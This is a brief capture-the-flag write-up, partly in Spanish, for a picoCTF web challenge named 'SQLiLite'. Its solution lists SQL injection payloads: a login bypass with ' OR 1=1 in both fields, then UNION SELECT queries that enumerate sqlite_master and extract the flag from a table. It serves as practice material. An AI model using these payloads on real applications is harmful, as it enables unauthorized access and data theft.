## Descripción
Can you find the flag on this website.

Try to find the flag [here](http://saturn.picoctf.net:56490/).

HINTS
1
SQLiLite
## Solución
```
al parecer el profe navega a travez de la base de datos dentro del sitio utilizando solicitudes de base de datos sqllite

admin' OR 1=1; esto dentro de username y password

hola' union select 1,2,tbl_name FROM sqlite_master;

buscando entre las tablas salio una que tenia la flag asi que nos dirigimos a esa para sacar la bandera utilizando 

hola' union select 1,2,flag FROM more_table;
```

## Notas adicionales

## Referencias
